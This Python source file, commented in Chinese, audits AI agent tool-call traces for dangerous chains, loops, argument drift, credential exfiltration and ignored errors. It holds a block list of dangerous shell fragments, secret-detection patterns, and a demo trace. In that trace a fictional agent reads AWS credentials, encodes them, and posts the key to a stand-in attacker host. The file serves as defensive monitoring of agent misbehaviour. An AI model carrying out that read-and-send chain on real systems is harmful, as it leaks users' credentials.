#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ToolChainWatch —— agent 工具调用链异常检测（rain.op Day 40 · 监测向）

读 agent 的工具调用轨迹（JSONL，每行一次调用），检出调用链层面的异常：
危险调用链、循环调用、参数漂移、敏感数据外发、错误结果被忽略。
按会话打 0–100 风险分，分级输出告警与处置建议。

与 Day 34 MCPGuard（调用时拦截）不同：这里是事后审计 —— 调用已经
发生完了，从整条链上看 agent 有没有“走偏”。
与 Day 36 AgentIncidentDesk（事件台账）不同：这里只盯调用链本身，
输出的是一次轨迹审计报告，可直接作为台账的一条事件来源。

只用 Python 标准库，离线可运行，不调用任何外部 API。

轨迹格式（JSONL，每行一次调用）：
    {"ts": "2026-11-15T09:00:01", "agent": "researcher",
     "tool": "read_file", "args": {"path": "/etc/passwd"},
     "status": "ok", "result": "root:x:0:0:..."}

用法：
    python toolchainwatch.py --demo                 # 内置演示：一条被植入 5 类异常的轨迹
    python toolchainwatch.py -i trace.jsonl         # 审计自己的轨迹文件
    python toolchainwatch.py -i trace.jsonl --json report.json
    python toolchainwatch.py -i trace.jsonl --window 8   # 危险链滑动窗口（默认 5 次调用）
"""
import argparse
import json
import os
import re
import sys
from collections import Counter

HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_TRACE = os.path.join(HERE, "sample_trace.jsonl")

# ---------- 规则常量 ----------

# 敏感路径：读了这些地方再往外发，就是危险链
SENSITIVE_PATHS = (
    "/etc/passwd", "/etc/shadow", ".ssh/id_rsa", ".aws/credentials",
    ".env", "credentials", "secrets", "/root/", "/etc/",
)
# 外发类工具：数据一旦进这里就离开了本机
EXTERNAL_TOOLS = {"http_post", "http_request", "send_email", "webhook_post",
                  "upload_file", "curl", "fetch_url"}
# 高危工具：能改系统状态
DANGEROUS_TOOLS = {"shell_exec", "exec", "run_command", "delete_file",
                   "write_file", "chmod", "eval"}
# 危险调用链：窗口内按顺序出现即命中（窗口默认 5 次调用）
DANGEROUS_CHAINS = [
    (("read_file", "shell_exec"), "先读敏感文件、再执行命令：读到的内容可能被拼进命令执行"),
    (("read_file", "http_post"), "先读文件、再向外发：疑似数据渗出链"),
    (("shell_exec", "http_post"), "先执行命令、再向外发：命令输出可能被带出"),
    (("read_file", "send_email"), "先读文件、再发邮件：文件内容可能随邮件外泄"),
    (("shell_exec", "write_file"), "先执行命令、再写文件：疑似 webshell/持久化落点"),
]
# 密钥与凭据形态
SECRET_PATTERNS = [
    (r"AKIA[0-9A-Z]{16}", "AWS Access Key"),
    (r"sk-[A-Za-z0-9]{16,}", "API 密钥（sk- 开头）"),
    (r"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----", "私钥"),
    (r"(?i)(password|passwd|pwd)\s*[:=]\s*\S{4,}", "明文密码"),
    (r"(?i)(api[_-]?key|token|secret)\s*[:=]\s*[A-Za-z0-9_\-]{8,}", "密钥/令牌"),
    (r"ghp_[A-Za-z0-9]{20,}", "GitHub 令牌"),
]
LOOP_REPEAT = 4        # 同一工具+同一参数连续重复 ≥4 次即循环调用
LOOP_WINDOW = 8        # 同一工具在 8 次调用内出现 ≥6 次也算循环
SCORE = {"chain": 35, "exfil": 35, "loop": 20, "drift": 20, "ignored": 15}


def is_sensitive_path(value):
    if not isinstance(value, str):
        return False
    low = value.lower()
    return any(p in low for p in SENSITIVE_PATHS)


def find_secrets(text):
    """在文本里找密钥形态，返回命中的种类列表。"""
    found = []
    for pat, label in SECRET_PATTERNS:
        if re.search(pat, text or ""):
            found.append(label)
    return found


def args_text(call):
    return json.dumps(call.get("args") or {}, ensure_ascii=False, sort_keys=True)


def tool_of(call):
    return (call.get("tool") or "").strip()


# ---------- 五组检测 ----------

def detect_chains(calls, window):
    findings = []
    for i in range(len(calls)):
        seg = calls[i:i + window]
        tools = [tool_of(c) for c in seg]
        for (a, b), desc in DANGEROUS_CHAINS:
            ia = [j for j, t in enumerate(tools) if t == a]
            ib = [j for j, t in enumerate(tools) if t == b]
            if not ia or not ib:
                continue
            # 链的起点必须是敏感读：读普通文件不算；取 b 之前最近一次敏感读
            chosen_a = None
            for j in ia:
                if j >= ib[0]:
                    break
                if a == "read_file":
                    arg_path = (seg[j].get("args") or {}).get("path", "")
                    if is_sensitive_path(arg_path):
                        chosen_a = j
                        break
                else:
                    chosen_a = j
                    break
            if chosen_a is None:
                continue
            findings.append({
                "rule": "dangerous_chain", "level": "高危",
                "score": SCORE["chain"],
                "calls": [i + 1 + chosen_a, i + 1 + ib[0]],
                "detail": f"调用 #{i + 1 + chosen_a}–"
                          f"#{i + 1 + ib[0]}：{a} → {b}。"
                          f"{desc}",
            })
    return findings


def detect_loops(calls):
    findings = []
    # 连续重复：同一工具 + 同一参数
    run_tool = run_args = None
    run_start = run_len = 0
    for idx, c in enumerate(calls, 1):
        key = (tool_of(c), args_text(c))
        if key == (run_tool, run_args):
            run_len += 1
        else:
            if run_len >= LOOP_REPEAT:
                findings.append({
                    "rule": "loop", "level": "中危", "score": SCORE["loop"],
                    "calls": list(range(run_start, run_start + run_len)),
                    "detail": f"调用 #{run_start}–#{run_start + run_len - 1}："
                              f"{run_tool} 带相同参数连续重复 {run_len} 次，"
                              "疑似 agent 陷入循环（未读结果就重试）。",
                })
            run_tool, run_args, run_start, run_len = key[0], key[1], idx, 1
    if run_len >= LOOP_REPEAT:
        findings.append({
            "rule": "loop", "level": "中危", "score": SCORE["loop"],
            "calls": list(range(run_start, run_start + run_len)),
            "detail": f"调用 #{run_start}–#{run_start + run_len - 1}："
                      f"{run_tool} 带相同参数连续重复 {run_len} 次，"
                      "疑似 agent 陷入循环（未读结果就重试）。",
        })
    # 窗口内高频：同一工具在 8 次调用里占 6 次以上
    for i in range(len(calls) - LOOP_WINDOW + 1):
        cnt = Counter(tool_of(c) for c in calls[i:i + LOOP_WINDOW])
        tool, n = cnt.most_common(1)[0]
        if n >= 6:
            findings.append({
                "rule": "loop", "level": "中危", "score": SCORE["loop"],
                "calls": list(range(i + 1, i + LOOP_WINDOW + 1)),
                "detail": f"调用 #{i + 1}–#{i + LOOP_WINDOW}：{tool} 在 "
                          f"{LOOP_WINDOW} 次调用里占 {n} 次，疑似无效重试循环。",
            })
            break
    return findings


def detect_drift(calls):
    """参数漂移：同一工具的参数从低敏走向高敏（路径上提、命令加危险操作）。"""
    findings = []
    seen_path = {}
    for idx, c in enumerate(calls, 1):
        tool = tool_of(c)
        args = c.get("args") or {}
        path = args.get("path") or args.get("file") or ""
        if tool in ("read_file", "write_file", "delete_file") and path:
            prev = seen_path.get(tool)
            if prev and is_sensitive_path(path) and not is_sensitive_path(prev):
                findings.append({
                    "rule": "arg_drift", "level": "中危", "score": SCORE["drift"],
                    "calls": [idx],
                    "detail": f"调用 #{idx}：{tool} 的路径从 {prev} 漂移到敏感路径 "
                              f"{path}，疑似权限/范围逐步扩大。",
                })
            seen_path[tool] = path
        cmd = args.get("command") or args.get("cmd") or ""
        if tool in DANGEROUS_TOOLS and cmd:
            dangerous = ("rm -rf", "curl", "wget", "chmod +x", "| sh", "nc ",
                         "> /etc/", "sudo")
            if any(d in cmd for d in dangerous):
                findings.append({
                    "rule": "arg_drift", "level": "高危", "score": SCORE["drift"],
                    "calls": [idx],
                    "detail": f"调用 #{idx}：{tool} 的命令含危险操作：{cmd[:80]}",
                })
    return findings


def detect_exfil(calls):
    findings = []
    for idx, c in enumerate(calls, 1):
        if tool_of(c) not in EXTERNAL_TOOLS:
            continue
        blob = args_text(c) + "\n" + str(c.get("result") or "")
        secrets = find_secrets(blob)
        if secrets:
            findings.append({
                "rule": "exfil", "level": "高危", "score": SCORE["exfil"],
                "calls": [idx],
                "detail": f"调用 #{idx}：{tool_of(c)} 向外发数据，内容含 "
                          f"{'、'.join(secrets)}，疑似凭据外泄。",
            })
    return findings


def detect_ignored_errors(calls):
    findings = []
    errors = [i for i, c in enumerate(calls, 1)
              if c.get("status") == "error"
              or "error" in str(c.get("result") or "").lower()[:200]]
    if len(errors) >= 3:
        findings.append({
            "rule": "ignored_error", "level": "中危", "score": SCORE["ignored"],
            "calls": errors,
            "detail": f"调用 {errors} 共 {len(errors)} 次返回错误，agent 未停下"
                      "排查就继续调用：错误结果被忽略，链上后续动作不可信。",
        })
    return findings


# ---------- 审计主流程 ----------

def audit(calls, window=5):
    findings = []
    findings += detect_chains(calls, window)
    findings += detect_loops(calls)
    findings += detect_drift(calls)
    findings += detect_exfil(calls)
    findings += detect_ignored_errors(calls)
    # 去重：同一规则同一批调用只记一次
    seen = set()
    uniq = []
    for f in findings:
        key = (f["rule"], tuple(f["calls"]))
        if key not in seen:
            seen.add(key)
            uniq.append(f)
    score = min(100, sum(f["score"] for f in uniq))
    if score >= 70:
        level, verdict = "高危", "建议立即冻结该 agent 的工具调用并人工复核整条链"
    elif score >= 40:
        level, verdict = "中危", "建议人工复核告警调用，确认是否为预期行为"
    elif score > 0:
        level, verdict = "低危", "建议留档观察，下次审计时看是否重复出现"
    else:
        level, verdict = "正常", "未检出调用链异常"
    by_tool = Counter(tool_of(c) for c in calls)
    return {"total_calls": len(calls), "score": score, "level": level,
            "verdict": verdict, "findings": uniq,
            "tools": dict(by_tool)}


def load_trace(path):
    calls = []
    with open(path, "r", encoding="utf-8") as f:
        for ln, line in enumerate(f, 1):
            line = line.strip()
            if not line:
                continue
            try:
                calls.append(json.loads(line))
            except json.JSONDecodeError:
                print(f"跳过第 {ln} 行：不是合法 JSON", file=sys.stderr)
    return calls


def print_report(report, source):
    print("=" * 64)
    print(f"ToolChainWatch 调用链审计报告 · 来源：{source}")
    print("=" * 64)
    print(f"调用总数：{report['total_calls']} · 风险分：{report['score']}/100"
          f" · 评级：{report['level']}")
    print(f"结论：{report['verdict']}")
    print(f"工具分布：{', '.join(f'{t}×{n}' for t, n in report['tools'].items())}")
    print()
    if not report["findings"]:
        print("未检出异常调用链。")
        return
    print(f"检出 {len(report['findings'])} 条告警：")
    for i, f in enumerate(report["findings"], 1):
        print(f"\n[{i}] [{f['level']}] {f['rule']}（+{f['score']} 分）")
        print(f"    {f['detail']}")
    print()
    print("处置建议：高危先冻结调用、再复核；中危逐条确认；低危留档观察。"
          "审计结论只针对这条轨迹，不代表 agent 本身可信或不可信。")


DEMO_TRACE = [
    {"ts": "2026-11-15T09:00:01", "agent": "researcher", "tool": "read_file",
     "args": {"path": "/tmp/notes.md"}, "status": "ok", "result": "公开笔记"},
    {"ts": "2026-11-15T09:00:05", "agent": "researcher", "tool": "read_file",
     "args": {"path": "/home/miku/.aws/credentials"}, "status": "ok",
     "result": "[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE"},
    {"ts": "2026-11-15T09:00:09", "agent": "researcher", "tool": "shell_exec",
     "args": {"command": "cat /home/miku/.aws/credentials | base64"}, "status": "ok",
     "result": "W2RlZmF1bHRdCmF3c19hY2Nlc3Nfa2V5X2lkID0gQUtJQUlPU0ZPRE5ON0VYQU1QTEU="},
    {"ts": "2026-11-15T09:00:12", "agent": "researcher", "tool": "http_post",
     "args": {"url": "https://evil.example/collect",
              "data": "AKIAIOSFODNN7EXAMPLE"}, "status": "ok", "result": "200"},
    {"ts": "2026-11-15T09:00:20", "agent": "researcher", "tool": "search_web",
     "args": {"query": "MCP 安全最佳实践"}, "status": "error", "result": "timeout"},
    {"ts": "2026-11-15T09:00:25", "agent": "researcher", "tool": "search_web",
     "args": {"query": "MCP 安全最佳实践"}, "status": "error", "result": "timeout"},
    {"ts": "2026-11-15T09:00:30", "agent": "researcher", "tool": "search_web",
     "args": {"query": "MCP 安全最佳实践"}, "status": "error", "result": "timeout"},
    {"ts": "2026-11-15T09:00:35", "agent": "researcher", "tool": "search_web",
     "args": {"query": "MCP 安全最佳实践"}, "status": "error", "result": "timeout"},
    {"ts": "2026-11-15T09:00:40", "agent": "researcher", "tool": "write_file",
     "args": {"path": "/tmp/summary.md", "content": "草稿"}, "status": "ok",
     "result": "written"},
]


def cmd_demo(args):
    print("ToolChainWatch 演示：一条被植入 5 类异常的调用轨迹（9 次调用）")
    print("异常：敏感文件读 → 命令执行 → 对外发送；密钥随外发数据泄露；"
          "同一查询连续失败 4 次仍重试。")
    print()
    report = audit(DEMO_TRACE, window=args.window)
    print_report(report, "内置演示轨迹")
    return 1 if report["score"] >= 70 else 0


def cmd_audit(args):
    if not os.path.exists(args.input):
        print(f"轨迹文件不存在：{args.input}")
        return 2
    calls = load_trace(args.input)
    if not calls:
        print("轨迹为空或无合法 JSON 行。")
        return 2
    report = audit(calls, window=args.window)
    print_report(report, args.input)
    if args.json:
        with open(args.json, "w", encoding="utf-8") as f:
            json.dump(report, f, ensure_ascii=False, indent=2)
        print(f"\n报告 JSON 已写入 {args.json}")
    return 1 if report["score"] >= 70 else 0


def main(argv=None):
    p = argparse.ArgumentParser(description="ToolChainWatch：agent 工具调用链异常检测")
    p.add_argument("-i", "--input", default=DEFAULT_TRACE,
                   help="轨迹 JSONL 文件（默认 sample_trace.jsonl）")
    p.add_argument("--demo", action="store_true", help="演示：审计内置异常轨迹")
    p.add_argument("--window", type=int, default=5,
                   help="危险链滑动窗口（调用次数，默认 5）")
    p.add_argument("--json", help="把审计报告写成 JSON 文件")
    args = p.parse_args(argv)
    if args.demo:
        return cmd_demo(args)
    return cmd_audit(args)


if __name__ == "__main__":
    sys.exit(main())
